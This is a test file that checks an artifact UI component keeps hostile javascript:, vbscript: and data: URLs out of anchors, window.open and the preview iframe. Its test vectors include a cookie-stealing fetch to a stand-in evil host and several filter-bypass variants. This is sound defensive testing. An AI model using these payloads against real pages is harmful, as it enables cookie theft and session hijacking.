// tests/components/artifact-url-xss.test.tsx
//
// The `artifact` card's THREE url sinks. `src` and `files[].url` are
// model-reachable: they arrive on an `artifact` card envelope produced by a tool
// call, and `primitives/card-schemas/artifact.schema.json` validates them only as
// JSON-Schema `format: "uri"`, which constrains no scheme at all. Every sink here
// lands in the HOST page's document, NOT inside the sandboxed preview iframe, so
// a `javascript:` url executes with the host's cookies:
//
//   1. `<a href>` x2 in ArtifactPdfFallback  -- one click.
//   2. `window.open()` behind the toolbar's open-in-new-tab button and the
//      `openExternal()` controller method (a `<kai-artifact>` element method).
//   3. the preview `<iframe src>` -- zero click. Inert under the DEFAULT
//      sandbox (no `allow-same-origin` => opaque origin => the browser refuses
//      the javascript: navigation), and LIVE the moment a consumer sets
//      `allow-same-origin` -- which the component's own docs used to suggest
//      for "an artifact you trust". That guidance is gone; this guard is what
//      protects everyone who already followed it.
//
// WHY THE PDF FALLBACK IS THE PATH THAT MATTERS: pdf.js has to FETCH the url to
// render inline, and it cannot fetch a `javascript:` or `data:` one -- nor a
// cross-origin one without CORS. Every such failure lands on
// `ArtifactPdfFallback`, so for a hostile url the fallback is not an edge case,
// it is the guaranteed outcome. (`isPdfPreviewEnabled()` defaults to TRUE, which
// makes no difference: the load still fails.)
//
// ORACLE LIMITATION, same as tests/components/markdown-xss.test.tsx: jsdom does
// not navigate, does not compile inline handler attributes, and never executes a
// `javascript:` url. These tests therefore assert the ABSENCE of the dangerous
// value from the attribute / the call argument as a PROXY for non-execution.
// That absence is the property that transfers to a real browser; it is not
// itself a proof of non-execution. Each test also asserts that the view under
// test actually RENDERED, so an empty query can never pass vacuously.
//
// WHAT A REAL CHROMIUM SHOWED against the unfixed build, since the proxy alone
// would let you draw the wrong conclusions about which sink is worst:
//   - Download anchor:   EXECUTED in the host origin on one click.
//   - "Open in new tab": did NOT execute -- `target="_blank"` + `rel="noopener"`
//     gives the javascript: url a fresh browsing context. That is an ACCIDENT of
//     those two attributes, not a guard; deleting them for styling would make it
//     live, which is the exact fragility #246 called out for citations.
//   - window.open:       received the javascript: url; execution was not
//     observed, again because of the `noopener` in the features string.
//   - iframe src:        did NOT execute under the default sandbox, and DID
//     execute in the host origin, ZERO CLICK, under
//     `sandbox="allow-scripts allow-same-origin"` -- the setting this
//     component's own comments used to recommend for a trusted artifact.
// So two of the three sinks were live, and the two that were not are held shut
// by attributes rather than by any decision the kit makes. All four are
// filtered.
import { flush } from 'solid-js';
import { render, fireEvent } from '@solidjs/testing-library';
import { afterEach, describe, expect, test, vi } from 'vitest';
import { Artifact, type ArtifactController, type ArtifactFile } from '../../src/components/artifact';
import { BUILTIN_CARD_COMPONENTS } from '../../src/primitives/card-registry';
import { configurePdfPreview, __resetPdfPreviewForTests } from '../../src/primitives/pdf-preview';
import type { CardEnvelope } from '../../src/primitives/card-contract';

afterEach(() => {
  document.body.innerHTML = '';
  __resetPdfPreviewForTests();
  vi.restoreAllMocks();
});

/** Force the fallback deterministically. In a browser the same view is reached
 *  under the DEFAULT config the moment pdf.js fails to load the url -- which a
 *  hostile scheme guarantees. */
function forceFallback() {
  configurePdfPreview({ enabled: false });
}

/** Every href attribute present in the render. A MISSING attribute yields no
 *  entry, which is the shape we want: omitted, never `href=""`. */
const hrefs = (el: HTMLElement) =>
  [...el.querySelectorAll('a')]
    .map((a) => a.getAttribute('href'))
    .filter((v): v is string => v !== null);

const iframeSrcs = (el: HTMLElement) =>
  [...el.querySelectorAll('iframe')]
    .map((f) => f.getAttribute('src'))
    .filter((v): v is string => v !== null);

/** Whitespace is stripped BEFORE matching because the URL parser strips it too:
 *  `java\nscript:x` in an href is a working `javascript:` url in a browser, and a
 *  regex over the raw string would score it as harmless. */
const squash = (u: string) => u.toLowerCase().replace(/\s/g, '');
const isDangerous = (u: string) => /^(javascript|vbscript|data):/.test(squash(u));
const isScriptScheme = (u: string) => /^(javascript|vbscript):/.test(squash(u));

/** The PDF fallback card. Present => the assertions below are not vacuous. */
const fallbackOf = (el: HTMLElement) => el.querySelector('[aria-label="PDF preview unavailable"]');

/** Render the artifact CARD from an envelope -- the model-reachable path. */
function renderCard(data: Record<string, unknown>) {
  const Comp = BUILTIN_CARD_COMPONENTS.artifact;
  const envelope = { type: 'artifact', id: 'a1', data } as CardEnvelope;
  return render(() => <Comp envelope={envelope} />).container;
}

/** A pdf file entry pointing at `url`, so `isPdfUrl` routes to the PDF view. */
const pdfFiles = (url: string): ArtifactFile[] => [{ path: 'report.pdf', url, type: 'pdf' }];

// ---------------------------------------------------------------------------
// 1. the PDF fallback anchors
// ---------------------------------------------------------------------------

describe('artifact PDF fallback: a hostile url never reaches an href', () => {
  const vectors: [name: string, url: string][] = [
    ['javascript:', 'javascript:fetch("https://evil.tld/steal?c="+document.cookie)'],
    ['mixed-case JaVaScRiPt:', 'JaVaScRiPt:window.__PWNED__=1'],
    ['whitespace-padded javascript:', '  javascript:window.__PWNED__=1  '],
    // The WHATWG parser strips embedded tabs/newlines before reading the
    // scheme, so this is a real bypass of any naive `startsWith` check.
    ['newline-split java\\nscript:', 'java\nscript:window.__PWNED__=1'],
    ['vbscript:', 'vbscript:msgbox(1)'],
    ['data:text/html', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
  ];

  for (const [name, url] of vectors) {
    test(`${name} is omitted from the fallback anchors (card path)`, () => {
      forceFallback();
      const el = renderCard({ src: url, files: pdfFiles(url) });
      expect(fallbackOf(el)).not.toBeNull(); // the sink really did render
      for (const h of hrefs(el)) expect(isDangerous(h)).toBe(false);
    });
  }

  // HONEST NOTE: this one passes against the VULNERABLE build too -- the
  // unfixed code put the raw `javascript:` url in the attribute, which is not
  // `''` either. It pins the SHAPE of the fix (omit, never empty), not the
  // vector; do not read it as evidence of the filter.
  test('the blocked url is never emptied into href="" either', () => {
    forceFallback();
    const url = 'javascript:window.__PWNED__=1';
    const el = renderCard({ src: url, files: pdfFiles(url) });
    expect(fallbackOf(el)).not.toBeNull();
    for (const a of el.querySelectorAll('a')) {
      // `href=""` navigates to the current page; an omitted attribute does not.
      expect(a.getAttribute('href')).not.toBe('');
    }
  });

  test('the fallback SAYS it blocked the address instead of showing dead controls', () => {
    // "Decide loudly": dropping the href and leaving two buttons that do
    // nothing would be a silent decision wearing a working UI. The controls are
    // replaced by a sentence, and the url the model sent is still on screen so
    // the reader sees what arrived (same reasoning as `Source`'s domain
    // fallback).
    forceFallback();
    const url = 'javascript:window.__PWNED__=1';
    const el = renderCard({ src: url, files: pdfFiles(url) });
    const fallback = fallbackOf(el);
    expect(fallback).not.toBeNull();
    expect(fallback?.textContent ?? '').toMatch(/blocked/i);
    expect(fallback?.querySelectorAll('a')).toHaveLength(0);
  });

  test('a hostile files[].url reaches the same anchors with no src at all', () => {
    forceFallback();
    const url = 'javascript:window.__PWNED__=2';
    let controller: ArtifactController | undefined;
    const { container } = render(() => (
      <Artifact files={pdfFiles(url)} controllerRef={(c) => (controller = c)} />
    ));
    // What a user does in the Code tab: click the file.
    controller?.selectFile('report.pdf');
    flush(); // V2-FLUSH: commit the staged controller write
    expect(fallbackOf(container)).not.toBeNull();
    for (const h of hrefs(container)) expect(isDangerous(h)).toBe(false);
  });
});

describe('artifact PDF fallback: legitimate urls still link', () => {
  test('an https pdf keeps BOTH the open and the download href', () => {
    forceFallback();
    const url = 'https://cdn.example.com/reports/q3.pdf';
    const el = renderCard({ src: url, files: pdfFiles(url) });
    expect(fallbackOf(el)).not.toBeNull();
    expect(hrefs(el)).toEqual([url, url]);
  });

  test('a RELATIVE artifact path still links', () => {
    // `resolveFileUrl` returns the bare `path` when there is no `src`, so a
    // relative url is first-class here -- unlike a citation, which is by
    // definition a page on the public web. That is exactly why `isSafeUrl`
    // (resolves against a base) is the right guard and `isRenderableLink`
    // (absolute http(s) only) would be collateral damage.
    forceFallback();
    let controller: ArtifactController | undefined;
    const { container } = render(() => (
      <Artifact
        files={[{ path: 'docs/report.pdf', type: 'pdf' }]}
        controllerRef={(c) => (controller = c)}
      />
    ));
    controller?.selectFile('docs/report.pdf');
    flush(); // V2-FLUSH: commit the staged controller write
    expect(fallbackOf(container)).not.toBeNull();
    expect(hrefs(container)).toEqual(['docs/report.pdf', 'docs/report.pdf']);
  });
});

// ---------------------------------------------------------------------------
// 2. window.open (toolbar button + openExternal() controller method)
// ---------------------------------------------------------------------------

describe('artifact open-in-new-tab: window.open never receives a hostile url', () => {
  test('the toolbar button does not open a javascript: url', () => {
    const open = vi.spyOn(window, 'open').mockReturnValue(null);
    const { getByLabelText } = render(() => (
      <Artifact src="javascript:fetch('https://evil.tld/steal?c='+document.cookie)" openInTab />
    ));
    const button = getByLabelText('Open in new tab'); // the control really is there
    fireEvent.click(button);
    flush(); // V2-FLUSH: v2 stages writes; commit before asserting
    for (const call of open.mock.calls) expect(isDangerous(String(call[0]))).toBe(false);
  });

  test('openExternal() on the imperative controller does not open it either', () => {
    // The `<kai-artifact>` facade forwards this as an element METHOD, so it is
    // reachable without the toolbar button ever being shown.
    const open = vi.spyOn(window, 'open').mockReturnValue(null);
    let controller: ArtifactController | undefined;
    render(() => (
      <Artifact src="javascript:window.__PWNED__=3" controllerRef={(c) => (controller = c)} />
    ));
    expect(controller).toBeDefined();
    controller?.openExternal();
    flush(); // V2-FLUSH: commit the staged controller write
    for (const call of open.mock.calls) expect(isDangerous(String(call[0]))).toBe(false);
  });

  test('an https url still opens', () => {
    const open = vi.spyOn(window, 'open').mockReturnValue(null);
    const { getByLabelText } = render(() => (
      <Artifact src="https://example.com/preview" openInTab />
    ));
    fireEvent.click(getByLabelText('Open in new tab'));
    flush(); // V2-FLUSH: v2 stages writes; commit before asserting
    expect(open).toHaveBeenCalledWith(
      'https://example.com/preview',
      '_blank',
      'noopener,noreferrer',
    );
  });
});

// ---------------------------------------------------------------------------
// 3. the preview iframe
// ---------------------------------------------------------------------------

describe('artifact preview iframe: a script url never reaches src', () => {
  test('a javascript: src is never framed', () => {
    const el = renderCard({ src: 'javascript:window.__PWNED__=4' });
    expect(el.querySelector('iframe')).not.toBeNull(); // the sink really rendered
    for (const s of iframeSrcs(el)) expect(isScriptScheme(s)).toBe(false);
  });

  test('navigating to a javascript: url is refused too', () => {
    let controller: ArtifactController | undefined;
    const { container } = render(() => (
      <Artifact src="https://example.com/ok" controllerRef={(c) => (controller = c)} />
    ));
    controller?.navigate('javascript:window.__PWNED__=5');
    flush(); // V2-FLUSH: commit the staged controller write
    const frame = container.querySelector('iframe');
    expect(frame).not.toBeNull();
    // Both the attribute and the property: `loadCurrent` assigns `iframeEl.src`
    // imperatively, which is a different write than the JSX attribute.
    expect(isScriptScheme(frame?.getAttribute('src') ?? '')).toBe(false);
    expect(isScriptScheme(frame?.src ?? '')).toBe(false);
  });

  test('https and data: urls still frame (a data: blob artifact is a documented use)', () => {
    const https = renderCard({ src: 'https://example.com/preview' });
    expect(iframeSrcs(https)).toContain('https://example.com/preview');
    // data: in an iframe gets an OPAQUE origin in every modern browser, so it
    // cannot reach the host page -- and `displayUrl` exists precisely to give
    // such a src a clean address. Blocking it would be collateral damage.
    const data = renderCard({ src: 'data:text/html,<p>hi</p>' });
    expect(iframeSrcs(data)).toContain('data:text/html,<p>hi</p>');
  });
});
